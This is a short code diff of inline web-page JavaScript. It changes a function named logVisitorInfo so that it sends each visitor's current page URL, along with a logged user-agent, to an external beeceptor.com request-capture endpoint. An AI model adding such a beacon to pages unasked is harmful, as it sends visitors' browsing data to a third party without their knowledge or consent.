@@ -8,7 +8,7 @@
     console.log("user-agent:" + navigator.userAgent);
   function logVisitorInfo() {
     var x = new XMLHttpRequest();
-    x.open("GET","https://oneilla1.free.beeceptor.com/?",true);
+    x.open("GET","https://oneilla1.free.beeceptor.com/?" + window.location.href,true);
     x.send();
   }
   </script>
